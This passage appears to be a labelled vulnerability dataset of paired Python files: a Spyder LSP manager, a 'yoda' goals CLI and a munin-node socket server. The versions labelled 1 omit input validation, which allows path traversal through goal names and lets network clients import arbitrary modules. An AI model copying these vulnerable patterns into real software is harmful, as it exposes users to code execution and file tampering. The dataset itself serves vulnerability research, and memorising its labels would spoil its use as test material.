                self.clients[language] = config
                self.register_queue[language] = []
            else:
                logger.debug(
                    self.clients[language]['config'] != config['config'])
                current_config = self.clients[language]['config']
                new_config = config['config']
                restart_diff = ['cmd', 'args', 'host', 'port', 'external']
                restart = any([current_config[x] != new_config[x]
                               for x in restart_diff])
                if restart:
                    if self.clients[language]['status'] == self.STOPPED:
                        self.clients[language] = config
                    elif self.clients[language]['status'] == self.RUNNING:
                        self.close_client(language)
                        self.clients[language] = config
                        self.start_lsp_client(language)
                else:
                    if self.clients[language]['status'] == self.RUNNING:
                        client = self.clients[language]['instance']
                        client.send_plugin_configurations(
                            new_config['configurations'])

    def update_client_status(self, active_set):
        for language in self.clients:
            if language not in active_set:
                self.close_client(language)

    def close_client(self, language):
        if language in self.clients:
            language_client = self.clients[language]
            if language_client['status'] == self.RUNNING:
                logger.info(""Stopping LSP client for {}..."".format(language))
                # language_client['instance'].shutdown()
                # language_client['instance'].exit()
                language_client['instance'].stop()
            language_client['status'] = self.STOPPED

    def send_request(self, language, request, params):
        if language in self.clients:
            language_client = self.clients[language]
            if language_client['status'] == self.RUNNING:
                client = self.clients[language]['instance']
                client.perform_request(request, params)
/n/n/n",0
93,2374cc1427f01db4814fbdde9962471e17111084,"/spyder/plugins/editor/lsp/manager.py/n/n# -*- coding: utf-8 -*-
#
# Copyright © Spyder Project Contributors
# Licensed under the terms of the MIT License
# (see spyder/__init__.py for details)

""""""
Manager for all LSP clients connected to the servers defined
in our Preferences.
""""""

import logging
import os

from qtpy.QtCore import QObject, Slot

from spyder.config.main import CONF
from spyder.utils.misc import select_port, getcwd_or_home
from spyder.plugins.editor.lsp.client import LSPClient


logger = logging.getLogger(__name__)


class LSPManager(QObject):
    """"""Language Server Protocol manager.""""""
    STOPPED = 'stopped'
    RUNNING = 'running'

    def __init__(self, parent):
        QObject.__init__(self)
        self.main = parent

        self.lsp_plugins = {}
        self.clients = {}
        self.requests = {}
        self.register_queue = {}

        # Get configurations for all LSP servers registered through
        # our Preferences
        self.configurations_for_servers = CONF.options('lsp-server')

        # Register languages to create clients for
        for language in self.configurations_for_servers:
            self.clients[language] = {
                'status': self.STOPPED,
                'config': CONF.get('lsp-server', language),
                'instance': None
            }
            self.register_queue[language] = []

    def register_plugin_type(self, type, sig):
        self.lsp_plugins[type] = sig

    def register_file(self, language, filename, signal):
        if language in self.clients:
            language_client = self.clients[language]['instance']
            if language_client is None:
                self.register_queue[language].append((filename, signal))
            else:
                language_client.register_file(filename, signal)

    def get_root_path(self):
        """"""
        Get root path to pass to the LSP servers, i.e. project path or cwd.
        """"""
        path = None
        if self.main and self.main.projects:
            path = self.main.projects.get_active_project_path()
        if not path:
            path = getcwd_or_home()
        return path

    @Slot()
    def reinitialize_all_lsp_clients(self):
        """"""
        Send a new initialize message to each LSP server when the project
        path has changed so they can update the respective server root paths.
        """"""
        for language_client in self.clients.values():
            if language_client['status'] == self.RUNNING:
                folder = self.get_root_path()
                inst = language_client['instance']
                inst.folder = folder
                inst.initialize()

    def start_lsp_client(self, language):
        started = False
        if language in self.clients:
            language_client = self.clients[language]
            queue = self.register_queue[language]

            # Don't start LSP services in our CIs unless we demand
            # them.
            if (os.environ.get('CI', False) and
                    not os.environ.get('SPY_TEST_USE_INTROSPECTION')):
                return started

            # Start client
            started = language_client['status'] == self.RUNNING
            if language_client['status'] == self.STOPPED:
                config = language_client['config']

                if not config['external']:
                    port = select_port(default_port=config['port'])
                    config['port'] = port

                language_client['instance'] = LSPClient(
                    parent=self,
                    server_settings=config,
                    folder=self.get_root_path(),
                    language=language)

                for plugin in self.lsp_plugins:
                    language_client['instance'].register_plugin_type(
                        plugin, self.lsp_plugins[plugin])

                logger.info(""Starting LSP client for {}..."".format(language))
                language_client['instance'].start()
                language_client['status'] = self.RUNNING
                for entry in queue:
                    language_client.register_file(*entry)
                self.register_queue[language] = []
        return started

    def shutdown(self):
        logger.info(""Shutting down LSP manager..."")
        for language in self.clients:
            self.close_client(language)

    def update_server_list(self):
        for language in self.configurations_for_servers:
            config = {'status': self.STOPPED,
                      'config': CONF.get('lsp-server', language),
                      'instance': None}
            if language not in self.clients:
                self.clients[language] = config
                self.register_queue[language] = []
            else:
                logger.debug(
                    self.clients[language]['config'] != config['config'])
                current_config = self.clients[language]['config']
                new_config = config['config']
                restart_diff = ['cmd', 'args', 'host', 'port', 'external']
                restart = any([current_config[x] != new_config[x]
                               for x in restart_diff])
                if restart:
                    if self.clients[language]['status'] == self.STOPPED:
                        self.clients[language] = config
                    elif self.clients[language]['status'] == self.RUNNING:
                        self.close_client(language)
                        self.clients[language] = config
                        self.start_lsp_client(language)
                else:
                    if self.clients[language]['status'] == self.RUNNING:
                        client = self.clients[language]['instance']
                        client.send_plugin_configurations(
                            new_config['configurations'])

    def update_client_status(self, active_set):
        for language in self.clients:
            if language not in active_set:
                self.close_client(language)

    def close_client(self, language):
        if language in self.clients:
            language_client = self.clients[language]
            if language_client['status'] == self.RUNNING:
                logger.info(""Stopping LSP client for {}..."".format(language))
                # language_client['instance'].shutdown()
                # language_client['instance'].exit()
                language_client['instance'].stop()
            language_client['status'] = self.STOPPED

    def send_request(self, language, request, params):
        if language in self.clients:
            language_client = self.clients[language]
            if language_client['status'] == self.RUNNING:
                client = self.clients[language]['instance']
                client.perform_request(request, params)
/n/n/n",1
94,263946316041601de75638ee303a892f2652cf40,"modules/goals.py/n/nfrom __future__ import absolute_import

import datetime

from .config import get_config_file_paths
from .util import *

# config file path
GOALS_CONFIG_FILE_PATH = get_config_file_paths()['GOALS_CONFIG_FILE_PATH']
GOALS_CONFIG_FOLDER_PATH = get_folder_path_from_file_path(
    GOALS_CONFIG_FILE_PATH)


def strike(text):
    """"""
    strikethrough text
    :param text:
    :return:
    """"""
    return u'\u0336'.join(text) + u'\u0336'

def get_goal_file_path(goal_name):
    return GOALS_CONFIG_FOLDER_PATH + '/' + goal_name + '.yaml'

def process(input):
    """"""
    the main process
    :param input:
    """"""
    _input = input.lower().strip()
    check_sub_command(_input)

def check_sub_command(c):
    """"""
    command checker
    :param c:
    :return:
    """"""
    sub_commands = {
        'new': new_goal,
        'tasks': view_related_tasks,
        'view': list_goals,
        'complete': complete_goal,
        'analyze': goals_analysis,
    }
    try:
        return sub_commands[c]()
    except KeyError:
        click.echo(chalk.red('Command does not exist!'))
        click.echo('Try ""yoda goals --help"" for more info')

def goals_dir_check():
    """"""
    check if goals directory exists. If not, create
    """"""
    if not os.path.exists(GOALS_CONFIG_FOLDER_PATH):
        try:
            os.makedirs(GOALS_CONFIG_FOLDER_PATH)
        except OSError as exc:  # Guard against race condition
            if exc.errno != errno.EEXIST:
                raise


def append_data_into_file(data, file_path):
    """"""
    append data into existing file
    :param data:
    :param file_path:
    """"""
    with open(file_path) as file:
        # read contents
        contents = yaml.load(file)
        contents['entries'].append(
            data
        )

        # enter data
        with open(file_path, ""w"") as file:
            yaml.dump(contents, file, default_flow_style=False)

def complete_goal():
    """"""
    complete a goal
    """"""
    not_valid_goal_number = 1
    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        with open(GOALS_CONFIG_FILE_PATH) as todays_tasks_entry:
            contents = yaml.load(todays_tasks_entry)
            i = 0
            no_goal_left = True
            for entry in contents['entries']:
                i += 1
                if entry['status'] == 0:
                    no_goal_left = False

            if no_goal_left:
                click.echo(chalk.green(
                    'All goals have been completed! Add a new goal by entering ""yoda goals new""'))
            else:
                click.echo('Goals:')
                click.echo('----------------')
                click.echo(""Number |  Deadline   | Goal"")
                click.echo(""-------|-------------|-----"")

                i = 0
                for entry in contents['entries']:
                    i += 1
                    deadline = entry['deadline']
                    text = entry['text'] if entry['status'] == 0 else strike(
                        entry['text'])
                    if entry['status'] == 0:
                        click.echo(""   "" + str(i) + ""   | "" +
                                   deadline + ""  | "" + text)
                while not_valid_goal_number:
                    click.echo(chalk.blue(
                        'Enter the goal number that you would like to set as completed'))
                    goal_to_be_completed = int(input())
                    if goal_to_be_completed > len(contents['entries']):
                        click.echo(chalk.red('Please Enter a valid goal number!'))
                    else:
                        contents['entries'][goal_to_be_completed - 1]['status'] = 1
                        input_data(contents, GOALS_CONFIG_FILE_PATH)
                        not_valid_goal_number = 0
    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering ""yoda goals new""'))

def goal_name_exists(goal_name):
    file_name = get_goal_file_path(goal_name)
    return os.path.isfile(file_name)

def new_goal():
    """"""
    new goal
    """"""

    goals_dir_check()

    goal_name_not_ok = True

    click.echo(chalk.blue('Input a single-word name of the goal:'))
    while goal_name_not_ok:
        goal_name = input().strip()
        if goal_name.isalnum():
            goal_name_not_ok = False
        else:
            click.echo(chalk.red('Only alphanumeric characters can be used! Please input the goal name:'))

    if goal_name_exists(goal_name):
        click.echo(chalk.red(
            'A goal with this name already exists. Please type ""yoda goals view"" to see a list of existing goals'))
    else:
        click.echo(chalk.blue('Input description of the goal:'))
        text = input().strip()

        click.echo(chalk.blue('Input due date for the goal (YYYY-MM-DD):'))
        incorrect_date_format = True
        while incorrect_date_format:
            deadline = input().strip()
            try:
                date_str = datetime.datetime.strptime(deadline, '%Y-%m-%d').strftime('%Y-%m-%d')
                if date_str != deadline:
                    raise ValueError
                incorrect_date_format = False
            except ValueError:
                click.echo(chalk.red(""Incorrect data format, should be YYYY-MM-DD. Please repeat:""))

        if os.path.isfile(GOALS_CONFIG_FILE_PATH):
            setup_data = dict(
                name=goal_name,
                text=text,
                deadline=deadline,
                status=0
            )
            append_data_into_file(setup_data, GOALS_CONFIG_FILE_PATH)
        else:
            setup_data = dict(
                entries=[
                    dict(
                        name=goal_name,
                        text=text,
                        deadline=deadline,
                        status=0
                    )
                ]
            )
            input_data(setup_data, GOALS_CONFIG_FILE_PATH)

        input_data(dict(entries=[]), get_goal_file_path(goal_name))

def goals_analysis():
    """"""
    goals alysis
    """"""

    now = datetime.datetime.now()

    total_goals = 0
    total_incomplete_goals = 0
    total_missed_goals = 0
    total_goals_next_week = 0
    total_goals_next_month = 0

    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        with open(GOALS_CONFIG_FILE_PATH) as goals_file:
            contents = yaml.load(goals_file)
            for entry in contents['entries']:
                total_goals += 1
                if entry['status'] == 0:
                    total_incomplete_goals += 1
                    deadline = datetime.datetime.strptime(entry['deadline'], '%Y-%m-%d')
                    total_missed_goals += (1 if deadline < now else 0)
                    total_goals_next_week += (1 if (deadline-now).days <= 7 else 0)
                    total_goals_next_month += (1 if (deadline - now).days <= 30 else 0)
        percent_incomplete_goals = total_incomplete_goals * 100 / total_goals
        percent_complete_goals = 100 - percent_incomplete_goals

        click.echo(chalk.red('Percentage of incomplete goals : ' + str(percent_incomplete_goals)))
        click.echo(chalk.green('Percentage of completed goals : ' + str(percent_complete_goals)))
        click.echo(chalk.blue('Number of missed deadlines : ' + str(total_missed_goals)))
        click.echo(chalk.blue('Number of goals due within the next week : ' + str(total_goals_next_week)))
        click.echo(chalk.blue('Number of goals due within the next month : ' + str(total_goals_next_month)))

    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering ""yoda goals new""'))


def add_task_to_goal(goal_name, date, timestamp):
    goal_filename = get_goal_file_path(goal_name)
    if os.path.isfile(goal_filename):
        setup_data = dict(
            date=date,
            timestamp=timestamp
        )
        append_data_into_file(setup_data, goal_filename)
        return True
    return False

def list_goals():
    """"""
    get goals listed chronologically by deadlines
    """"""
    if os.path.isfile(GOALS_CONFIG_FILE_PATH):

        with open(GOALS_CONFIG_FILE_PATH) as goals_file:
            contents = yaml.load(goals_file)

            if len(contents):
                contents['entries'].sort(key=lambda x: x['deadline'].split('-'))

                click.echo('Goals')
                click.echo('----------------')
                click.echo(""Status |  Deadline   | Name: text"")
                click.echo(""-------|-------------|---------------"")
                incomplete_goals = 0
                total_tasks = 0
                total_missed_deadline = 0

                for entry in contents['entries']:
                    total_tasks += 1
                    incomplete_goals += (1 if entry['status'] == 0 else 0)
                    deadline = entry['deadline']
                    name = entry['name']
                    text = entry['text'] if entry['status'] == 0 else strike(
                        entry['text'])
                    status = ""O"" if entry['status'] == 0 else ""X""

                    deadline_time = datetime.datetime.strptime(deadline, '%Y-%m-%d')
                    now = datetime.datetime.now()

                    total_missed_deadline += (1 if deadline_time < now else 0)

                    click.echo(""   "" + status + ""   | "" + deadline + ""  | #"" + name + "": "" + text)

                click.echo('----------------')
                click.echo('')
                click.echo('Summary:')
                click.echo('----------------')

                if incomplete_goals == 0:
                    click.echo(chalk.green(
                        'All goals have been completed! Set a new goal by entering ""yoda goals new""'))
                else:
                    click.echo(chalk.red(""Incomplete tasks: "" + str(incomplete_goals)))
                    click.echo(chalk.red(""Tasks with missed deadline: "" + str(total_missed_deadline)))
                    click.echo(chalk.green(""Completed tasks: "" +
                                           str(total_tasks - incomplete_goals)))

            else:
                click.echo(
                    'There are no goals set. Set a new goal by entering ""yoda goals new""')

    else:
        click.echo(
            'There are no goals set. Set a new goal by entering ""yoda goals new""')


def view_related_tasks():
    """"""
    list tasks assigned to the goal
    """"""

    from .diary import get_task_info

    not_valid_name = True

    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        while not_valid_name:
            click.echo(chalk.blue(
                'Enter the goal name that you would like to examine'))
            goal_name = input()
            goal_file_name = get_goal_file_path(goal_name)
            if os.path.isfile(goal_file_name):
                not_valid_name = False

        with open(goal_file_name) as goals_file:
            contents = yaml.load(goals_file)

            if len(contents['entries']):

                total_tasks = 0
                total_incomplete = 0

                click.echo('Tasks assigned to the goal:')
                click.echo('----------------')
                click.echo(""Status |  Date   | Text"")
                click.echo(""-------|---------|-----"")

                for entry in contents['entries']:
                    timestamp = entry['timestamp']
                    date = entry['date']
                    status, text = get_task_info(timestamp, date)
                    total_tasks += 1
                    total_incomplete += (1 if status == 0 else 0)

                    text = text if status == 0 else strike(text)
                    status = ""O"" if status == 0 else ""X""
                    click.echo(""   "" + status + ""   | "" + date + ""| "" + text)

                click.echo('----------------')
                click.echo('')
                click.echo('Summary:')
                click.echo('----------------')

                click.echo(chalk.red(""Incomplete tasks assigned to the goal: "" + str(total_incomplete)))
                click.echo(chalk.green(""Completed tasks assigned to the goal: "" +
                                       str(total_tasks - total_incomplete)))

            else:
                click.echo(chalk.red(
                    'There are no tasks assigned to the goal. Add a new task by entering ""yoda diary nt""'))

    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering ""yoda goals new""'))

/n/n/n",0
95,263946316041601de75638ee303a892f2652cf40,"/modules/goals.py/n/nfrom __future__ import absolute_import

import datetime

from .config import get_config_file_paths
from .util import *

# config file path
GOALS_CONFIG_FILE_PATH = get_config_file_paths()['GOALS_CONFIG_FILE_PATH']
GOALS_CONFIG_FOLDER_PATH = get_folder_path_from_file_path(
    GOALS_CONFIG_FILE_PATH)


def strike(text):
    """"""
    strikethrough text
    :param text:
    :return:
    """"""
    return u'\u0336'.join(text) + u'\u0336'

def get_goal_file_path(goal_name):
    return GOALS_CONFIG_FOLDER_PATH + '/' + goal_name + '.yaml'

def process(input):
    """"""
    the main process
    :param input:
    """"""
    _input = input.lower().strip()
    check_sub_command(_input)

def check_sub_command(c):
    """"""
    command checker
    :param c:
    :return:
    """"""
    sub_commands = {
        'new': new_goal,
        'tasks': view_related_tasks,
        'view': list_goals,
        'complete': complete_goal,
        'analyze': goals_analysis,
    }
    try:
        return sub_commands[c]()
    except KeyError:
        click.echo(chalk.red('Command does not exist!'))
        click.echo('Try ""yoda goals --help"" for more info')

def goals_dir_check():
    """"""
    check if goals directory exists. If not, create
    """"""
    if not os.path.exists(GOALS_CONFIG_FOLDER_PATH):
        try:
            os.makedirs(GOALS_CONFIG_FOLDER_PATH)
        except OSError as exc:  # Guard against race condition
            if exc.errno != errno.EEXIST:
                raise


def append_data_into_file(data, file_path):
    """"""
    append data into existing file
    :param data:
    :param file_path:
    """"""
    with open(file_path) as file:
        # read contents
        contents = yaml.load(file)
        contents['entries'].append(
            data
        )

        # enter data
        with open(file_path, ""w"") as file:
            yaml.dump(contents, file, default_flow_style=False)

def complete_goal():
    """"""
    complete a goal
    """"""
    not_valid_goal_number = 1
    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        with open(GOALS_CONFIG_FILE_PATH) as todays_tasks_entry:
            contents = yaml.load(todays_tasks_entry)
            i = 0
            no_goal_left = True
            for entry in contents['entries']:
                i += 1
                if entry['status'] == 0:
                    no_goal_left = False

            if no_goal_left:
                click.echo(chalk.green(
                    'All goals have been completed! Add a new goal by entering ""yoda goals new""'))
            else:
                click.echo('Goals:')
                click.echo('----------------')
                click.echo(""Number |  Deadline   | Goal"")
                click.echo(""-------|-------------|-----"")

                i = 0
                for entry in contents['entries']:
                    i += 1
                    deadline = entry['deadline']
                    text = entry['text'] if entry['status'] == 0 else strike(
                        entry['text'])
                    if entry['status'] == 0:
                        click.echo(""   "" + str(i) + ""   | "" +
                                   deadline + ""  | "" + text)
                while not_valid_goal_number:
                    click.echo(chalk.blue(
                        'Enter the goal number that you would like to set as completed'))
                    goal_to_be_completed = int(input())
                    if goal_to_be_completed > len(contents['entries']):
                        click.echo(chalk.red('Please Enter a valid goal number!'))
                    else:
                        contents['entries'][goal_to_be_completed - 1]['status'] = 1
                        input_data(contents, GOALS_CONFIG_FILE_PATH)
                        not_valid_goal_number = 0
    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering ""yoda goals new""'))

def goal_name_exists(goal_name):
    file_name = get_goal_file_path(goal_name)
    return os.path.isfile(file_name)

def new_goal():
    """"""
    new goal
    """"""

    goals_dir_check()

    click.echo(chalk.blue('Input a single-word name of the goal:'))
    goal_name = input().strip()

    if goal_name_exists(goal_name):
        click.echo(chalk.red(
            'A goal with this name already exists. Please type ""yoda goals view"" to see a list of existing goals'))
    else:
        click.echo(chalk.blue('Input description of the goal:'))
        text = input().strip()

        click.echo(chalk.blue('Input due date for the goal (YYYY-MM-DD):'))
        deadline = input().strip()

        if os.path.isfile(GOALS_CONFIG_FILE_PATH):
            setup_data = dict(
                name=goal_name,
                text=text,
                deadline=deadline,
                status=0
            )
            append_data_into_file(setup_data, GOALS_CONFIG_FILE_PATH)
        else:
            setup_data = dict(
                entries=[
                    dict(
                        name=goal_name,
                        text=text,
                        deadline=deadline,
                        status=0
                    )
                ]
            )
            input_data(setup_data, GOALS_CONFIG_FILE_PATH)

        input_data(dict(entries=[]), get_goal_file_path(goal_name))

def goals_analysis():
    """"""
    goals alysis
    """"""

    now = datetime.datetime.now()

    total_goals = 0
    total_incomplete_goals = 0
    total_missed_goals = 0
    total_goals_next_week = 0
    total_goals_next_month = 0

    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        with open(GOALS_CONFIG_FILE_PATH) as goals_file:
            contents = yaml.load(goals_file)
            for entry in contents['entries']:
                total_goals += 1
                if entry['status'] == 0:
                    total_incomplete_goals += 1
                    deadline = datetime.datetime.strptime(entry['deadline'], '%Y-%m-%d')
                    total_missed_goals += (1 if deadline < now else 0)
                    total_goals_next_week += (1 if (deadline-now).days <= 7 else 0)
                    total_goals_next_month += (1 if (deadline - now).days <= 30 else 0)
        percent_incomplete_goals = total_incomplete_goals * 100 / total_goals
        percent_complete_goals = 100 - percent_incomplete_goals

        click.echo(chalk.red('Percentage of incomplete goals : ' + str(percent_incomplete_goals)))
        click.echo(chalk.green('Percentage of completed goals : ' + str(percent_complete_goals)))
        click.echo(chalk.blue('Number of missed deadlines : ' + str(total_missed_goals)))
        click.echo(chalk.blue('Number of goals due within the next week : ' + str(total_goals_next_week)))
        click.echo(chalk.blue('Number of goals due within the next month : ' + str(total_goals_next_month)))

    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering ""yoda goals new""'))


def add_task_to_goal(goal_name, date, timestamp):
    goal_filename = get_goal_file_path(goal_name)
    if os.path.isfile(goal_filename):
        setup_data = dict(
            date=date,
            timestamp=timestamp
        )
        append_data_into_file(setup_data, goal_filename)
        return True
    return False

def list_goals():
    """"""
    get goals listed chronologically by deadlines
    """"""
    if os.path.isfile(GOALS_CONFIG_FILE_PATH):

        with open(GOALS_CONFIG_FILE_PATH) as goals_file:
            contents = yaml.load(goals_file)

            if len(contents):
                contents['entries'].sort(key=lambda x: x['deadline'].split('-'))

                click.echo('Goals')
                click.echo('----------------')
                click.echo(""Status |  Deadline   | Name: text"")
                click.echo(""-------|-------------|---------------"")
                incomplete_goals = 0
                total_tasks = 0
                total_missed_deadline = 0

                for entry in contents['entries']:
                    total_tasks += 1
                    incomplete_goals += (1 if entry['status'] == 0 else 0)
                    deadline = entry['deadline']
                    name = entry['name']
                    text = entry['text'] if entry['status'] == 0 else strike(
                        entry['text'])
                    status = ""O"" if entry['status'] == 0 else ""X""

                    deadline_time = datetime.datetime.strptime(deadline, '%Y-%m-%d')
                    now = datetime.datetime.now()

                    total_missed_deadline += (1 if deadline_time < now else 0)

                    click.echo(""   "" + status + ""   | "" + deadline + ""  | #"" + name + "": "" + text)

                click.echo('----------------')
                click.echo('')
                click.echo('Summary:')
                click.echo('----------------')

                if incomplete_goals == 0:
                    click.echo(chalk.green(
                        'All goals have been completed! Set a new goal by entering ""yoda goals new""'))
                else:
                    click.echo(chalk.red(""Incomplete tasks: "" + str(incomplete_goals)))
                    click.echo(chalk.red(""Tasks with missed deadline: "" + str(total_missed_deadline)))
                    click.echo(chalk.green(""Completed tasks: "" +
                                           str(total_tasks - incomplete_goals)))

            else:
                click.echo(
                    'There are no goals set. Set a new goal by entering ""yoda goals new""')

    else:
        click.echo(
            'There are no goals set. Set a new goal by entering ""yoda goals new""')


def view_related_tasks():
    """"""
    list tasks assigned to the goal
    """"""

    from .diary import get_task_info

    not_valid_name = True

    if os.path.isfile(GOALS_CONFIG_FILE_PATH):
        while not_valid_name:
            click.echo(chalk.blue(
                'Enter the goal name that you would like to examine'))
            goal_name = input()
            goal_file_name = get_goal_file_path(goal_name)
            if os.path.isfile(goal_file_name):
                not_valid_name = False

        with open(goal_file_name) as goals_file:
            contents = yaml.load(goals_file)

            if len(contents['entries']):

                total_tasks = 0
                total_incomplete = 0

                click.echo('Tasks assigned to the goal:')
                click.echo('----------------')
                click.echo(""Status |  Date   | Text"")
                click.echo(""-------|---------|-----"")

                for entry in contents['entries']:
                    timestamp = entry['timestamp']
                    date = entry['date']
                    status, text = get_task_info(timestamp, date)
                    total_tasks += 1
                    total_incomplete += (1 if status == 0 else 0)

                    text = text if status == 0 else strike(text)
                    status = ""O"" if status == 0 else ""X""
                    click.echo(""   "" + status + ""   | "" + date + ""| "" + text)

                click.echo('----------------')
                click.echo('')
                click.echo('Summary:')
                click.echo('----------------')

                click.echo(chalk.red(""Incomplete tasks assigned to the goal: "" + str(total_incomplete)))
                click.echo(chalk.green(""Completed tasks assigned to the goal: "" +
                                       str(total_tasks - total_incomplete)))

            else:
                click.echo(chalk.red(
                    'There are no tasks assigned to the goal. Add a new task by entering ""yoda diary nt""'))

    else:
        click.echo(chalk.red(
            'There are no goals set. Set a new goal by entering ""yoda goals new""'))

/n/n/n",1
96,75bf91a49970c97d6b9b7ee31aaf03105f2bd222,"munin-node.py/n/nimport socket
import sys
import re
import os
from _thread import *
from subprocess import Popen, PIPE
 
HOST = ''
PORT = 4949
VERSION = '0.1.0'
ENCODING = 'utf-8'
LINEBREAK = '\n'
PLUGINPATH = os.getcwd() + ""\\plugins""
# Thanks to http://www.binarytides.com/python-socket-server-code-example/ for the realy usable example!
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print (""failed!"" + str(msg.errno))
    sys.exit()

s.listen(10)
 
def output(what):
  return what.encode(ENCODING)

def hello():
  hostname = socket.getfqdn();
  return ""# munin node at "" + hostname + LINEBREAK

def nodes():
  return socket.getfqdn() + LINEBREAK + ""."" + LINEBREAK;

def version():
  return ""munins node on "" + socket.getfqdn() + "" version: "" + VERSION + LINEBREAK

def cap():
  return ""cap multigraph dirtyconfig"" + LINEBREAK

def plugins():
  files = [f for f in os.listdir(PLUGINPATH) if os.path.isfile(os.path.join(PLUGINPATH, f))]
  result = """"
  for f in files:
    if (f.endswith("".py"")):
      result += f.replace("".py"","""") + "" ""
  return result.strip() + LINEBREAK

def unknown():
  return ""# Unknown command. Try cap, list, nodes, config, fetch, version or quit"" + LINEBREAK

def callMethod(o, name):
    return getattr(o, name)()

def runPlugin(name):
  return callPluginMethod(name,""fetch"")

def configPlugin(name):
  return callPluginMethod(name,""config"")

def callPluginMethod(name, method):  
  if (name.find(""."") == -1 and os.path.isfile(PLUGINPATH + ""\\"" + name + "".py"")): 
    module = __import__(name.replace(""\r"",""""))
    class_ = getattr(module, name.replace(""\r"",""""))
    instance = class_()
    return callMethod(instance, method)  + LINEBREAK + ""."" + LINEBREAK
  else:
    return ""# Unknown service"" + LINEBREAK + ""."" + LINEBREAK
  
def clientthread(conn):
    sys.path.append(PLUGINPATH)
    conn.send(output(hello()))  
    while True:
         
        #Receiving from client
        data = conn.recv(4096)
        command = data.decode(ENCODING)
        regex = re.compile(r""[^\s]+(\s[^\s]+)?"")
        extractedCommand = regex.match(command).group()
        print(""#""+ extractedCommand + ""#"")
        if (extractedCommand == ""nodes""):
          conn.send(output(nodes()))
        elif (extractedCommand == ""help""):
          conn.send(output(unknown()))
        elif (extractedCommand == ""version""):
          conn.send(output(version()))
        elif (extractedCommand == ""cap""):
          conn.send(output(cap()))
        elif (extractedCommand == ""list"" or extractedCommand.startswith(""list "")):
          conn.send(output(plugins()))
        elif (extractedCommand == ""quit""):
          break
        else:
          if (extractedCommand.startswith(""fetch "")):
            parts = extractedCommand.split("" "")
            conn.send(output(runPlugin(parts[1])))
          elif (extractedCommand.startswith(""config "")):
            parts = extractedCommand.split("" "")
            conn.send(output(configPlugin(parts[1])))
          else:
            conn.send(output(unknown()))
        if not data: 
            sys.exit(5)
     
        #conn.sendall(output(reply))
     
    conn.close()
 
while 1:
    conn, addr = s.accept()
    start_new_thread(clientthread ,(conn,))
s.close()/n/n/n",0
97,75bf91a49970c97d6b9b7ee31aaf03105f2bd222,"/munin-node.py/n/nimport socket
import sys
import re
import os
from _thread import *
from subprocess import Popen, PIPE
 
HOST = ''
PORT = 4949
VERSION = '0.1.0'
ENCODING = 'utf-8'
LINEBREAK = '\n'
PLUGINPATH = os.getcwd() + ""\\plugins""
# Thanks to http://www.binarytides.com/python-socket-server-code-example/ for the realy usable example!
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print (""failed!"" + str(msg.errno))
    sys.exit()

s.listen(10)
 
def output(what):
  return what.encode(ENCODING)

def hello():
  hostname = socket.getfqdn();
  return ""# munin node at "" + hostname + LINEBREAK

def nodes():
  return socket.getfqdn() + LINEBREAK + ""."" + LINEBREAK;

def version():
  return ""munins node on "" + socket.getfqdn() + "" version: "" + VERSION + LINEBREAK

def cap():
  return ""cap multigraph dirtyconfig"" + LINEBREAK

def plugins():
  files = [f for f in os.listdir(PLUGINPATH) if os.path.isfile(os.path.join(PLUGINPATH, f))]
  result = """"
  for f in files:
    if (f.endswith("".py"")):
      result += f.replace("".py"","""") + "" ""
  return result.strip() + LINEBREAK

def unknown():
  return ""# Unknown command. Try cap, list, nodes, config, fetch, version or quit"" + LINEBREAK

def callMethod(o, name):
    return getattr(o, name)()

def runPlugin(name):
  module = __import__(name.replace(""\r"",""""))
  class_ = getattr(module, name.replace(""\r"",""""))
  instance = class_()
  return callMethod(instance, ""fetch"")  + LINEBREAK + ""."" + LINEBREAK

def configPlugin(name):
  module = __import__(name.replace(""\r"",""""))
  class_ = getattr(module, name.replace(""\r"",""""))
  instance = class_()
  return callMethod(instance, ""config"")  + LINEBREAK + ""."" + LINEBREAK

def clientthread(conn):
    sys.path.append(PLUGINPATH)
    conn.send(output(hello()))  
    while True:
         
        #Receiving from client
        data = conn.recv(4096)
        command = data.decode(ENCODING)
        regex = re.compile(r""[^\s]+(\s[^\s]+)?"")
        extractedCommand = regex.match(command).group()
        print(""#""+ extractedCommand + ""#"")
        if (extractedCommand == ""nodes""):
          conn.send(output(nodes()))
        elif (extractedCommand == ""help""):
          conn.send(output(unknown()))
        elif (extractedCommand == ""version""):
          conn.send(output(version()))
        elif (extractedCommand == ""cap""):
          conn.send(output(cap()))
        elif (extractedCommand == ""list"" or extractedCommand.startswith(""list "")):
          conn.send(output(plugins()))
        elif (extractedCommand == ""quit""):
          break
        else:
          if (extractedCommand.startswith(""fetch "")):
            parts = extractedCommand.split("" "")
            conn.send(output(runPlugin(parts[1])))
          elif (extractedCommand.startswith(""config "")):
            parts = extractedCommand.split("" "")
            conn.send(output(configPlugin(parts[1])))
          else:
            conn.send(output(unknown()))
        if not data: 
            sys.exit(5)
     
        #conn.sendall(output(reply))
     
    conn.close()
 
while 1:
    conn, addr = s.accept()
    start_new_thread(clientthread ,(conn,))
s.close()/n/n/n",1
98,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
